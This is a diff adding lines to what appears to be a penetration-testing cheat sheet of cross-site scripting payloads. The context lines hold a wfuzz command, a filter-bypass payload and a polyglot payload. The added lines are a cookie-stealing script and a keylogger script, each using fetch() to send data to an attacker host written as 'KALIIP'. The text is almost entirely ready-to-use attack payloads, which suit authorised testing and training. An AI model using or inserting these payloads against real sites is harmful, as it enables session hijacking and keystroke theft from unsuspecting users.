@@ -43,6 +43,12 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$URL/in
 # Bypass filters that strip out malicious words such like "script"
 <sscriptcript>alert('XSS');</sscriptcript>
 
+# Session stealing via Fetch
+<script>fetch('http://KALIIP/steal?cookie=' + btoa(document.cookie));</script>
+
+# Keylogger
+<script>document.onkeypress = function(e) { fetch('http://KALIIP/log?key=' + btoa(e.key) );}</script>
+
 # Polygot payload (Can bypass multiple filters)
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS)//>\x3e
 ```
